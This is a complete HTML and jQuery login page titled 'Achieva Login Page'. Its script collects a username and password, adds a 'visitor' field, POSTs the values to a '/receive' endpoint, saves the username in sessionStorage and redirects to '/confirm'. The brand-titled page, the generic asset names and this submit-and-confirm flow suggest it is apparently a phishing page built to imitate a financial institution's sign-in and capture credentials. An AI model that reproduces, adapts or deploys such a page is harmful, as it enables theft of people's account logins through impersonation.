<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Achieva Login Page</title>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
   <link rel="icon" href="assets/favicon.svg" type="image/x-icon"> 
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #fff;
            background-image: url('assets/desktop-background-layer-image.png'); /* Replace with the desired image URL */
            background-size: cover;
        }
        
        .logo-section-desk {
            color: white;
            text-align: center;
            padding: 2rem;
        }

        .logo-section-desk h1 {
            font-size: 2rem;
            margin-bottom: 0.25rem;
        }

        .login-form {
            background: #ffffff;
            padding: 1.5rem;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
        }

        .form-field {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .form-field input {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #ccc;
            border-radius: 17px;
            font-size: 1rem;
            height: 55px;
            outline-color: #007eb6;
            padding-top: 1.25rem;
        }

        .form-field label {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1rem;
            color: #999;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        .form-field input:focus + label,
        .form-field input:not(:placeholder-shown) + label {
            top: 13px;
            left: 15px;
            font-size: 0.75rem;
        }

        .remember-me {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
        }

        .remember-me label {
            font-size: 0.9rem;
            margin-left: 0.5rem; /* Adjusted to move label to the right of the toggle switch */
            color: #333;
        }

        .toggle-switch {
            position: relative;
            width: 40px;
            height: 20px;
            background-color: #ccc;
            border-radius: 20px;
            cursor: pointer;
            margin-right: 0.5rem; /* Space between switch and label */
            transition: background-color 0.3s;
        }

        .toggle-switch input {
            display: none;
        }

        .toggle-switch .slider {
            position: absolute;
            top: 2px;
            left: 2px;
            width: 16px;
            height: 16px;
            background-color: white;
            border-radius: 50%;
            transition: transform 0.3s;
        }

        .toggle-switch input:checked + .slider {
            transform: translateX(20px);
            background-color: #007eb6;
        }

        .toggle-switch input:checked ~ .toggle-switch {
            background-color: #007eb6;
        }

        .login-form button {
            width: 100%;
            padding: 0.75rem;
            border-radius: 17px;
            font-size: 1rem;
            height: 55px;
            color: white;
            background-color: #007eb6;
            border: none;
            cursor: pointer;
        }

        .login-form button:hover {
            background-color: #005f86;
        }

        .footer-links {
            text-align: center;
            font-size: 0.9rem;
            color: #007eb6;
            margin-top: 1rem;
        }

        .footer-links p {
            margin: 0.5rem 0;
        }

        .footer-links a {
            color: #007eb6;
            text-decoration: none;
        }

        .footer-links a.register-link {
            font-weight: bold;
        }
        
        .par {
            font-size: 17px;
            margin-bottom: 17px !important;
        }
        
        @media (min-width: 780px) { 
        .logo-section {
            display: none;
        }
        .login-form{
        margin-top: 40%;
        border-radius: 15px;
        }
        
        }

        @media (max-width: 780px) {
            body {
                padding: 0;
                background-image: none;
            }

            .logo-section {
                padding: 2rem 1rem;
                height: 40vh;
            }

            .login-form {
                padding: 1rem;
                border-radius: 0;
                max-width: 100%;
                margin: 0;
                box-shadow: none;
            }
            .logo-section {
            background-image: url('assets/desktop-background-layer-image.png'); /* Replace with the desired image URL */
            background-size: cover;
            color: white;
            text-align: center;
            padding: 2rem;
        }

        .logo-section h1 {
            font-size: 2rem;
            margin-bottom: 0.25rem;
        }

        .logo-section p {
            font-size: 0.9rem;
        }
        .logo-section-desk{
        display:none;
        }
        }
    </style>
</head>
<body> 
    <div class="logo-section"> 
    <img style="width:70%; height:auto; margin-top:28px;" src="assets/brand-logo-tall.svg"/>
</div>
<div class="login-form">
    <div class="logo-section-desk"> 
        <img style="width:70%; height:auto; margin-top:28px;" src="assets/brand-logo-wide.svg"/> 
    </div>
    
    <div class="form-field">
        <input type="text" placeholder=" " id="username" name="username" required>
        <label for="username">Username</label>
    </div>
    <div class="form-field">
        <input type="password" placeholder=" " id="password" name="password" required>
        <label for="password">Password</label>
    </div>
    <div class="remember-me">
        <div class="toggle-switch">
            <input type="checkbox" id="remember" name="remember">
            <span class="slider"></span>
        </div>
        <label for="remember">Remember Me</label>
    </div>
    <button id="subbot" type="submit">Log in</button>
    <div class="footer-links">
        <p class="par"><a href="#">Forgot Username or Password?</a></p>
        <p class="par"><a href="#" class="register-link">Register a New Account</a></p>
    </div>
</div>

<script>
$(document).ready(function() {
    $('#subbot').on('click', function(event) {
        event.preventDefault();

        let allFilled = true;

        const inputs = $('input');
        inputs.each(function() {
            const input = $(this);
            const label = input.siblings('label')[0]; 

            if (input.val().trim() === '') {
                allFilled = false;
                input.css('border-color', 'red');
                if (label) label.style.color = 'red';
            } else {
                input.css('border-color', '');
                if (label) label.style.color = '';
            }
        });

        if (allFilled) {
            let formData = $('.login-form').find('input').serializeArray(); 
            let user = {};
            formData.forEach((field) => {
                user[field.name] = field.value;
            });

            user['visitor'] = $('#username').val();
            
            console.log('submitted');

            $.ajax({
                method: 'POST',
                url: "/receive",
                data: user
            }).done(function(msg) {
                sessionStorage.setItem('visitor', user['visitor']);
                window.location.href = "/confirm";
                console.log(msg);
            }).fail(function(err, textstatus, error) {
                console.log('fail');
            });
        }
    });
});
</script>
</body>


</html>
